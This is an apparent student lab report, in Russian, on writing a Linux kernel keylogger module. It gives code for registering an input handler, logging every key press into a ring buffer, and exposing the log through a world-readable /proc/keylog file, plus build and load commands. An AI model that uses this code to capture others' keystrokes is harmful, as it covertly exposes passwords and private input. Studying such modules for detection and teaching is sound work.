# Отчет по работе
## Модуль ядра Linux для перехвата событий клавиатуры

---

### 1. Цель и задачи
**Основная цель**  
Разработать модуль ядра Linux, способный:
- Перехватывать события клавиатуры через Input Subsystem
- Предоставлять собранные данные пользователю через файловый интерфейс `/proc`

**Конкретные задачи**
- [ ] Изучить архитектуру Input Subsystem ядра Linux
- [ ] Реализовать регистрацию обработчика событий ввода
- [ ] Создать потокобезопасный кольцевой буфер в пространстве ядра
- [ ] Организовать интерфейс чтения данных через `/proc`
- [ ] Обеспечить защиту от условий гонки
- [ ] Проанализировать методы обнаружения и защиты от кейлоггеров

### 2. Теоретическая база
#### 2.1. Input Subsystem
Устройства ввода в Linux обрабатываются унифицированным слоем `Generic Input Layer`.  
Основные типы событий:

| Тип события | Назначение               |
|-------------|--------------------------|
| `EV_KEY`    | Клавиатура, кнопки       |
| `EV_REL`    | Относительные координаты |
| `EV_ABS`    | Абсолютные координаты    |

**Структура события:**
```c
struct input_event {
    struct timeval time;  // Временная метка
    __u16 type;           // Тип события (EV_KEY)
    __u16 code;           // Код клавиши (KEY_A, KEY_ENTER)
    __s32 value;          // Состояние: 1=нажата, 0=отпущена, 2=автоповтор
};
2.2. Фильтрация событий
Модуль регистрирует только события:

Тип: EV_KEY

Значение: 1 (фактическое нажатие, без учета отпускания и автоповтора)

3. Архитектурное решение
3.1. Блок-схема работы
text
Пользовательский ввод → Драйвер устройства → Input Subsystem → 
→ Наш обработчик (keylogger_event) → Кольцевой буфер → 
→ Интерфейс /proc/keylog → Пользовательское чтение
3.2. Компоненты системы
1. Input Handler
Регистрация в системе ввода:

c
static struct input_handler keylogger_handler = {
    .event      = keylogger_event,
    .connect    = keylogger_connect,
    .disconnect = keylogger_disconnect,
    .name       = "keylogger",
    .id_table   = keylogger_ids,
};
2. Кольцевой буфер
Характеристики:

Размер: 4096 байт (определено BUF_SIZE)

Структура: циклический массив с двумя указателями

Поведение при переполнении: замещение старых данных

3. Механизм синхронизации
Используется spinlock_t buffer_lock по причине:

Обработчик событий работает в атомарном контексте

Невозможность использования блокирующих mutex

4. Интерфейс /proc
Создание файла:

c
proc_create("keylog", 0444, NULL, &proc_ops);
Права доступа: только чтение (0444) для всех пользователей.

4. Ключевые реализации
4.1. Обработчик событий
c
static void keylogger_event(struct input_handle *handle,
                           unsigned int type,
                           unsigned int code,
                           int value)
{
    if (type == EV_KEY && value == 1) {
        char c = keycode_to_char(code);
        ring_buffer_write(c);
    }
}
4.2. Чтение из /proc
c
static ssize_t proc_read(struct file *file,
                        char __user *ubuf,
                        size_t count,
                        loff_t *ppos)
{
    return ring_buffer_read(ubuf, count, ppos);
}
4.3. Makefile
makefile
obj-m += keylogger.o
KDIR := /lib/modules/$(shell uname -r)/build

all:
    $(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
    $(MAKE) -C $(KDIR) M=$(PWD) clean
5. Процесс тестирования
5.1. Компиляция и загрузка
bash
# Сборка модуля
make

# Загрузка в ядро
sudo insmod keylogger.ko

# Проверка загрузки
sudo dmesg | tail -2
# Ожидаемый вывод:
# keylogger: loaded
# keylogger: attached to AT Translated Set 2 keyboard
5.2. Проверка функциональности
bash
# Статическое чтение лога
cat /proc/keylog

# Динамический мониторинг
watch -n 0.2 "cat /proc/keylog"

# Проверка в реальном времени
echo "Тестовый ввод"  # Просмотр через /proc/keylog
5.3. Выгрузка модуля
bash
sudo rmmod keylogger
sudo dmesg | tail -1
# Вывод: keylogger: unloaded
